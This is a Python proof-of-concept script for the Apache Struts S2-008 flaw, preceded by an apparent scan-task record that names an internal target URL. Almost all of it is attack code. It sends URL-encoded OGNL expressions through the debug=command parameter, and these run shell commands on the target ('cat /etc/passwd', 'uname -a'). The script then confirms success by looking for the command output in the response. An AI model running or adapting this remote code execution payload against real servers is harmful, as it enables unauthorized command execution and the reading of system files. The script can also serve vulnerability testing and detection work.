{"task_name":"mkt","vul_id":88,"task_id":46,"dst_ip":"http://10.96.129.5:2008/devmode.action"}
#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
import sys
import requests
import traceback
import socket
import datetime
import time
import urlparse
sleep_time = 3


class S2_008_Hole():
    def __init__(self, url):
        now = datetime.datetime.today()
        self.local_time = now.strftime('%Y-%m-%d %H:%M:%S')
        self.check_url = url
        self.hole_name = 's2-008'
        self.detect_method = 'http get'
        self.urlinfo = urlparse.urlparse(url)
        self.headers = {
            'Host': self.urlinfo.hostname,
            'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; BOIE9;)',
            'Referer': self.check_url,
            'banner': 's2-008 poc from cf_hb.'
        }
        self.info = "通过{method}请求访问链接加上{poc},根据返回结果中含有目标指令结果，可以判断目标含有该漏洞."

    def verify(self):
        poc = [
            "?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27cat /etc/passwd%27%29.getInputStream%28%29%29)",
            "?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27uname%20-a%27%29.getInputStream%28%29%29)"]
        res = ["/root:/bin/bash", "Linux"]
        i = -1
        for poc_add in poc:
            i = i + 1
            poc_url = self.check_url + poc_add
            try:
                req = requests.session()
                resp = req.get(poc_url, headers=self.headers, timeout=3)
                # print(resp)
                # print(str(resp.content)[2:-1])
                time.sleep(sleep_time)
                # print(str(i) + 'a:' + str(resp.status_code and res[i] in str(resp.content)[2:-1]))
                # print(str(i) + ':' + str(res[i] in str(resp.content)[2:-1]))
                if resp.status_code and res[i] in str(resp.content)[2:-1]:
                    #					print(self.local_time,'|',self.hole_name,'|',self.check_url,'|',self.detect_method,'|',poc_add)
                    re = {
                        'tc_time': self.local_time,
                        'hole_name': self.hole_name,
                        'method': self.detect_method,
                        'info': self.info.format(
                            method=self.detect_method,
                            poc=poc_add
                        )
                    }
                    return re
            except (
                socket.timeout,
                requests.exceptions.TooManyRedirects,
                requests.exceptions.ConnectTimeout,
                requests.exceptions.ConnectionError,
                requests.exceptions.ReadTimeout,
                TimeoutError,
                ConnectionResetError,
                socket.gaierror
            ):
                return None
            except Exception as e:
                print("Failed to connection target...")
                traceback.print_exc()
                print(str(e))
                return None
        return None


def scan(url):
    hole_008 = S2_008_Hole(url)
    result = hole_008.verify()
    if result is None:
        print("False;False;000")
    else:
        print("True;True;000")


if __name__=="__main__":
    scan(sys.argv[1])

